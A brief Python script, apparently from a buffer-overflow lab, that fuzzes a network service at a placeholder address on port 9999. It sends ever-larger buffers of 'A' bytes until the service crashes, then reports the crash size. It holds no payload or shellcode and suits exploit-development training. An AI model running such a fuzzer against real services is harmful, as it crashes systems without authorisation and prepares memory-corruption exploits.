#!/usr/bin/python3

import sys, socket 

from time import sleep 

buffer = b"A" * 100

while True:
	try:

			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('Machine IP', 9999))

			s.send((buffer))
			s.close()
			sleep(1)
			buffer = buffer + b"A"*100

	except:

			print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
			sys.exit()
